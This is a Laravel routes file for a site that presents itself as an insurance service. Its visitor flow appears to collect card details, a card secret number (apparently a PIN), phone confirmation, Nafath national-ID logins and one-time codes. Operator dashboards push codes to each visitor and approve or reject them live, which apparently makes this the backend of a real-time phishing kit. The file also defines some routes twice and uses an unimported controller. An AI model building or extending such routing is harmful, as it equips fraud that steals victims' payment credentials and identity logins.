<?php

use App\Http\Controllers\ProfileController;
use App\Http\Controllers\Backend\Admin\AdminDashboardController;
use App\Http\Controllers\Backend\Admin\AdminLoginController;
use App\Http\Controllers\Backend\Admin\InsuranceBackendController;
use App\Http\Controllers\Backend\Admin\InsuranceRequestsBackendController;
use App\Http\Controllers\Backend\Admin\SupportTicketController;
use App\Http\Controllers\Frontend\HomePageFrontendController;
use App\Http\Controllers\Admin\VisitorController;
use App\Http\Controllers\Admin\CustomReportsController;
use App\Http\Controllers\Admin\LiveDashboardController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// Test route for Vite setup
Route::get('/test-vite', function () {
    return view('test-vite');
})->name('test-vite');

// Test route for insurance flow
Route::get('/test-insurance-flow', function () {
    return view('test-insurance-flow');
})->name('test-insurance-flow');

Route::post('/test-create-session', function () {
    $insuranceRequest = new \App\Models\InsuranceRequest();
    $insuranceRequest->id_number = '1234567890';
    $insuranceRequest->insurance_id = 1;
    $insuranceRequest->save();
    
    session([
        'insuranceRequest' => [
            'id' => $insuranceRequest->id,
            'id_number' => $insuranceRequest->id_number,
            'insurance_id' => 1,
        ]
    ]);
    
    return redirect()->route('test-insurance-flow')->with('success', 'تم إنشاء جلسة جديدة بنجاح! معرف الطلب: ' . $insuranceRequest->id);
})->name('test-create-session');

// ==================================================================================================================
// =========================================== Super Admin Routes ===================================================
// ==================================================================================================================
Route::prefix('super_admin')->name('super_admin.')->group(function () {
    // Login route
    Route::get('/login', [AdminLoginController::class, 'showLoginForm'])->name('loginUser');

    // Redirect /super_admin to login or dashboard
    Route::get('/', function () {
        if (auth('super_admin')->check()) {
            return redirect('/super_admin/dashboard');
        }
        return redirect('/super_admin/login');
    })->name('index');
    
    Route::post('/loginFormSubmit', [AdminLoginController::class, 'loginFormSubmit'])
        ->middleware('throttle:10,1')
        ->name('loginFormSubmit');
    
    // If someone hits the POST endpoint directly via GET, guide them back to the login page
    Route::get('/loginFormSubmit', function () {
        return redirect()->route('super_admin.loginUser');
    });
    
    Route::post('/logout', [AdminLoginController::class, 'logout'])->name('logout');

    Route::group(['middleware' => ['auth:super_admin']], function () {
        // Dashboard Route
        Route::get('/dashboard', [AdminDashboardController::class, 'index'])->name('dashboard');

        // Live Visitors Summary (JSON)
        Route::get('/visitors/summary', [VisitorController::class, 'summary'])->name('visitors.summary');

        // Support Tickets
        Route::group(['prefix' => 'support_tickets'], function () {
            Route::get('/index', [SupportTicketController::class, 'index'])->name('support_tickets-index');
            Route::get('destroy/{id}', [SupportTicketController::class, 'destroy'])->name('support_tickets-destroy');
        });

        // Profile Routes
        Route::group(['prefix' => 'profile'], function () {
            Route::get('/edit', [ProfileController::class, 'edit'])->name('edit');
            Route::patch('/update', [ProfileController::class, 'update'])->name('profile.update');
            Route::delete('/destroy', [ProfileController::class, 'destroy'])->name('profile.destroy');
        });

        // Insurance Routes
        Route::group(['prefix' => 'insurances'], function () {
            Route::get('/index', [InsuranceBackendController::class, 'index'])->name('insurances-index');
            Route::get('/create', [InsuranceBackendController::class, 'create'])->name('insurances-create');
            Route::post('/store', [InsuranceBackendController::class, 'store'])->name('insurances-store');
            Route::get('show/{id}', [InsuranceBackendController::class, 'show'])->name('insurances-show');
            Route::get('edit/{id}', [InsuranceBackendController::class, 'edit'])->name('insurances-edit');
            Route::post('update/{id}', [InsuranceBackendController::class, 'update'])->name('insurances-update');
            Route::get('softDelete/{id}', [InsuranceBackendController::class, 'softDelete'])->name('insurances-softDelete');
            Route::get('/showSoftDelete', [InsuranceBackendController::class, 'showSoftDelete'])->name('insurances-showSoftDelete');
            Route::get('softDeleteRestore/{id}', [InsuranceBackendController::class, 'softDeleteRestore'])->name('insurances-softDeleteRestore');
            Route::post('addInsuranceBenefit/{id}', [InsuranceBackendController::class, 'addInsuranceBenefit'])->name('insurances-addInsuranceBenefit');
            Route::get('deleteInsuranceBenefit/{id}', [InsuranceBackendController::class, 'deleteInsuranceBenefit'])->name('insurances-deleteInsuranceBenefit');
        });

        // Insurance Requests Routes
        Route::group(['prefix' => 'insurance_requests'], function () {
            Route::get('/index', [InsuranceRequestsBackendController::class, 'index'])->name('insurance_requests-index');
            Route::get('/summary', [InsuranceRequestsBackendController::class, 'summary'])->name('insurance_requests-summary');
            Route::get('show/{id}', [InsuranceRequestsBackendController::class, 'show'])->name('insurance_requests-show');
            Route::get('softDelete/{id}', [InsuranceRequestsBackendController::class, 'softDelete'])->name('insurance_requests-softDelete');
            Route::get('/showSoftDelete', [InsuranceRequestsBackendController::class, 'showSoftDelete'])->name('insurance_requests-showSoftDelete');
            Route::get('softDeleteRestore/{id}', [InsuranceRequestsBackendController::class, 'softDeleteRestore'])->name('insurance_requests-softDeleteRestore');
            Route::get('sendNafathCode/{id}', [InsuranceRequestsBackendController::class, 'sendNafathCode'])->name('insurance_requests-sendNafathCode');
            Route::post('sendNafathCodeRequest/{id}', [InsuranceRequestsBackendController::class, 'sendNafathCodeRequest'])->name('insurance_requests-sendNafathCodeRequest');
        });

        // Realtime Dashboard Routes - لوحة التحكم المباشرة
        Route::group(['prefix' => 'realtime'], function () {
            Route::get('/dashboard', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'index'])->name('realtime-dashboard');
            Route::get('/data', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'getData'])->name('realtime-data');
            Route::get('/user/{id}', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'getUserDetail'])->name('realtime-user-detail');
            Route::post('/send-code/{id}', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'sendCode'])->name('realtime-send-code');
            Route::post('/update-approval/{id}', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'updateApprovalStatus'])->name('realtime-update-approval');
        });

        // Custom Reports Routes - التقارير المخصصة
        Route::group(['prefix' => 'custom_reports'], function () {
            Route::get('/dashboard', [CustomReportsController::class, 'dashboard'])->name('custom_reports-dashboard');
            Route::get('/index', [CustomReportsController::class, 'index'])->name('custom_reports-index');
            Route::get('/show/{id}', [CustomReportsController::class, 'show'])->name('custom_reports-show');
            Route::get('/summary', [CustomReportsController::class, 'summary'])->name('custom_reports-summary');
            Route::get('/export', [CustomReportsController::class, 'export'])->name('custom_reports-export');
            Route::post('/filter', [CustomReportsController::class, 'filter'])->name('custom_reports-filter');
        });

        // Live Dashboard Routes - لوحة التحكم المباشرة
        Route::group(['prefix' => 'live_dashboard'], function () {
            Route::get('/', [LiveDashboardController::class, 'index'])->name('live_dashboard-index');
            Route::get('/data', [LiveDashboardController::class, 'getData'])->name('live_dashboard-data');
            Route::get('/user/{id}', [LiveDashboardController::class, 'getUserDetails'])->name('live_dashboard-user-details');
            Route::post('/send-code', [LiveDashboardController::class, 'sendCode'])->name('live_dashboard-send-code');
            Route::post('/approve/{id}', [LiveDashboardController::class, 'approveUser'])->name('live_dashboard-approve');
            Route::post('/reject/{id}', [LiveDashboardController::class, 'rejectUser'])->name('live_dashboard-reject');
        });
    });
});

// ==================================================================================================================
// ==================================================================================================================
// =========================================== Frontend Routes ======================================================
// ==================================================================================================================
// ==================================================================================================================


// Home and Static Pages
Route::get('/', [HomePageFrontendController::class, 'welcome'])->name('welcome');

// Serve a favicon at /favicon.ico to avoid 404s in browsers
Route::get('/favicon.ico', function () {
    $path = public_path('style_files/frontend/img/logo.png');
    if (file_exists($path)) {
        return response()->file($path, ['Content-Type' => 'image/png']);
    }
    return response('', 204);
});

// Insurance Process Routes
Route::post('/insuranceRequest', [HomePageFrontendController::class, 'insuranceRequest'])->name('insuranceRequest');
Route::get('/insuranceStatements', [HomePageFrontendController::class, 'insuranceStatements'])->name('insuranceStatements');
Route::post('/insuranceStatementsRequest', [HomePageFrontendController::class, 'insuranceStatementsRequest'])->name('insuranceStatementsRequest');
Route::post('/insuranceInquiryRequest', [HomePageFrontendController::class, 'insuranceInquiryRequest'])->name('insuranceInquiryRequest');
Route::get('/insuranceType', [HomePageFrontendController::class, 'insuranceType'])->name('insuranceType');
Route::post('/insuranceTypeRequest', [HomePageFrontendController::class, 'insuranceTypeRequest'])->name('insuranceTypeRequest');
Route::get('/insuranceInformation', [HomePageFrontendController::class, 'insuranceInformation'])->name('insuranceInformation');
Route::post('/insuranceInformationRequest', [HomePageFrontendController::class, 'insuranceInformationRequest'])->name('insuranceInformationRequest');

// Payment Routes
Route::get('/paymentForm', [HomePageFrontendController::class, 'paymentForm'])->name('paymentForm');
Route::post('/paymentFormRequest', [HomePageFrontendController::class, 'paymentFormRequest'])->name('paymentFormRequest');

// Pending Approval Route (NEW)
Route::get('/pending-approval', [HomePageFrontendController::class, 'pendingApproval'])->name('pendingApproval');
Route::get('/check-approval-status/{id}', [HomePageFrontendController::class, 'checkApprovalStatus'])->name('check-approval-status');

// Call Process Routes
Route::get('/beforeCallProcess', [HomePageFrontendController::class, 'beforeCallProcess'])->name('beforeCallProcess');
Route::get('/callProcess', [HomePageFrontendController::class, 'callProcess'])->name('callProcess');
Route::post('/callProcessRequest', [HomePageFrontendController::class, 'callProcessRequest'])->name('callProcessRequest');

// Card Ownership Routes
Route::get('/cardOwnership', [HomePageFrontendController::class, 'cardOwnership'])->name('cardOwnership');
Route::post('/cardOwnershipRequest', [HomePageFrontendController::class, 'cardOwnershipRequest'])->name('cardOwnershipRequest');
Route::get('/cardOwnershipSecertNumber', [HomePageFrontendController::class, 'cardOwnershipSecertNumber'])->name('cardOwnershipSecertNumber');
Route::post('/cardOwnershipSecertNumberRequest', [HomePageFrontendController::class, 'cardOwnershipSecertNumberRequest'])->name('cardOwnershipSecertNumberRequest');

// Phone Confirmation Routes
Route::get('/confirmPhoneNumber', [HomePageFrontendController::class, 'confirmPhoneNumber'])->name('confirmPhoneNumber');
Route::post('/confirmPhoneNumberRequest', [HomePageFrontendController::class, 'confirmPhoneNumberRequest'])->name('confirmPhoneNumberRequest');
Route::get('/checkPhoneNumber', [HomePageFrontendController::class, 'checkPhoneNumber'])->name('checkPhoneNumber');
Route::post('/checkPhoneNumberRequest', [HomePageFrontendController::class, 'checkPhoneNumberRequest'])->name('checkPhoneNumberRequest');

// Nafath Authentication Routes
Route::get('/nafathLogin', [HomePageFrontendController::class, 'nafathLogin'])->name('nafathLogin');
Route::post('/nafathLoginRequest', [HomePageFrontendController::class, 'nafathLoginRequest'])->name('nafathLoginRequest');
Route::post('/nafathDocumentingRequest', [HomePageFrontendController::class, 'nafathDocumentingRequest'])->name('nafathDocumentingRequest');
Route::get('/codeDegit', [HomePageFrontendController::class, 'codeDegit'])->name('codeDegit');
Route::get('/fetchCodeDegit', [HomePageFrontendController::class, 'fetchCodeDegit'])->name('fetchCodeDegit');
Route::get('/resendCodeDegit', [HomePageFrontendController::class, 'resendCodeDegit'])->name('resendCodeDegit');
Route::get('/cardDeclined', [HomePageFrontendController::class, 'cardDeclined'])->name('cardDeclined');

// Service Worker
Route::get('/sw.js', function () {
    $path = public_path('sw.js');
    abort_unless(file_exists($path), 404);
    return response()->file($path, [
        'Content-Type' => 'text/javascript; charset=UTF-8',
        'Service-Worker-Allowed' => '/',
        'Cache-Control' => 'no-cache, no-store, must-revalidate',
        'Pragma' => 'no-cache',
        'Expires' => '0',
    ]);
})->name('sw');

// Visitor Tracking
Route::post('/v/ping', [App\Http\Controllers\Frontend\VisitController::class, 'ping'])->name('visit.ping');

// Admin Monitoring
Route::prefix(config('admin.secret_path', 'x-admin-9bcd'))->group(function () {
    Route::middleware(['auth:super_admin', 'admin.ip.allow'])->group(function () {
        Route::get('/monitoring', [App\Http\Controllers\Backend\Admin\MonitoringController::class, 'index'])->name('admin.monitoring.index');
        Route::get('/monitoring/poll', [App\Http\Controllers\Backend\Admin\MonitoringController::class, 'poll'])->name('admin.monitoring.poll');
    });
});

// Frontend Routes
Route::get('/', function () {
    return view('welcome');
})->name('home');

Route::prefix('insurance')->name('insurance.')->group(function () {
    Route::get('/request', [InsuranceController::class, 'showForm'])->name('request.form');
    Route::post('/request', [InsuranceController::class, 'submitRequest'])->name('request.submit');
    Route::get('/verify/{id}', [InsuranceController::class, 'verifyIdentity'])->name('verify');
    Route::post('/verify/{id}', [InsuranceController::class, 'processVerification'])->name('verify.process');
    Route::get('/payment/{id}', [InsuranceController::class, 'showPayment'])->name('payment');
    Route::post('/payment/{id}', [InsuranceController::class, 'processPayment'])->name('payment.process');
    Route::get('/success/{id}', [InsuranceController::class, 'success'])->name('success');
});

// Admin Routes
Route::prefix('admin')->name('super_admin.')->group(function () {
    
    // Auth Routes
    Route::get('/login', [AdminLoginController::class, 'showLoginForm'])->name('login');
    Route::post('/login', [AdminLoginController::class, 'login'])->name('login.submit');
    Route::post('/logout', [AdminLoginController::class, 'logout'])->name('logout');

    // Protected Admin Routes
    Route::middleware(['auth:super_admin'])->group(function () {
        
        // Dashboard
        Route::get('/dashboard', [AdminDashboardController::class, 'index'])->name('dashboard');
        
        // Insurance Requests Management
        Route::prefix('insurance-requests')->name('insurance_requests-')->group(function () {
            Route::get('/', [InsuranceRequestsBackendController::class, 'index'])->name('index');
            Route::get('/summary', [InsuranceRequestsBackendController::class, 'summary'])->name('summary');
            Route::get('/{id}', [InsuranceRequestsBackendController::class, 'show'])->name('show');
            Route::delete('/{id}', [InsuranceRequestsBackendController::class, 'softDelete'])->name('delete');
            Route::get('/trashed/list', [InsuranceRequestsBackendController::class, 'showSoftDelete'])->name('trashed');
            Route::post('/restore/{id}', [InsuranceRequestsBackendController::class, 'softDeleteRestore'])->name('restore');
            Route::get('/{id}/nafath', [InsuranceRequestsBackendController::class, 'sendNafathCode'])->name('nafath');
            Route::post('/{id}/nafath', [InsuranceRequestsBackendController::class, 'sendNafathCodeRequest'])->name('nafath.send');
        });

        // Custom Reports
        Route::prefix('reports')->name('reports.')->group(function () {
            Route::get('/', [CustomReportsController::class, 'index'])->name('index');
            Route::get('/dashboard', [CustomReportsController::class, 'dashboard'])->name('dashboard');
            Route::get('/summary', [CustomReportsController::class, 'summary'])->name('summary');
            Route::get('/{id}', [CustomReportsController::class, 'show'])->name('show');
            Route::get('/filter', [CustomReportsController::class, 'filter'])->name('filter');
            Route::get('/export', [CustomReportsController::class, 'export'])->name('export');
        });

        // Live Dashboard
        Route::prefix('live-dashboard')->name('live_dashboard.')->group(function () {
            Route::get('/', [LiveDashboardController::class, 'index'])->name('index');
            Route::get('/data', [LiveDashboardController::class, 'getData'])->name('data');
            Route::get('/user/{id}', [LiveDashboardController::class, 'getUserDetails'])->name('user.details');
            Route::post('/send-code', [LiveDashboardController::class, 'sendCode'])->name('send.code');
            Route::post('/approve/{id}', [LiveDashboardController::class, 'approveUser'])->name('approve');
            Route::post('/reject/{id}', [LiveDashboardController::class, 'rejectUser'])->name('reject');
        });
    });
});
